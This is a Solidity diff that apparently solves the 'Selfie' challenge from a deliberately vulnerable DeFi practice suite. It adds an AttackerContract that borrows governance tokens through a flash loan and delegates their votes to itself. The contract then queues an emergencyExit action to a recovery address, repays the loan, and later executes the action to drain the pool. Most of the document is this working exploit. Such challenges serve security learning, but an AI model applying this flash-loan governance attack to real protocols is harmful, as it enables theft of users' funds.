@@ -7,6 +7,9 @@ import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156Fl
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
 import {SimpleGovernance} from "./SimpleGovernance.sol";
+import {DamnValuableVotes} from "../DamnValuableVotes.sol";
+
+import {console} from "forge-std/console.sol";
 
 contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
     bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
@@ -73,5 +76,44 @@ contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
         token.transfer(receiver, amount);
 
         emit EmergencyExit(receiver, amount);
+    }
+}
+
+contract AttackerContract is IERC3156FlashBorrower {
+    address public immutable recoveryAddr;
+    SimpleGovernance public immutable governance;
+    SelfiePool public immutable selfiePool;
+    DamnValuableVotes public immutable token;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    uint256 public actionId;
+
+    constructor(address _recoveryAddr, address _pool, address _governance, address _token) {
+        recoveryAddr = _recoveryAddr;
+        selfiePool = SelfiePool(_pool);
+        token = DamnValuableVotes(_token);
+        governance = SimpleGovernance(_governance);
+    }
+
+    // ? This function will be called by the pool after sending the flash loan amount to this contract.
+    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
+        // Create governance action
+        // console.log('onFlashLoan method of attacker contract called');
+        // console.log(token.balanceOf(address(this)) == 1500000e18); // true
+        token.delegate(address(this));
+        actionId = governance.queueAction(
+            address(selfiePool), 0, abi.encodeWithSignature("emergencyExit(address)", recoveryAddr)
+        );
+        // Approve tokens to pool to it can transfer back the loan amount and complete the flash loan successfully.
+        token.approve(address(selfiePool), amount + fee);
+        return CALLBACK_SUCCESS;
+    }
+
+    function attack() external {
+        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
+    }
+
+    // Call this after action delay i.e., after 2 days to execute the queued action and drain the pool.
+    function executeProposal() external {
+        governance.executeAction(actionId);
     }
 }
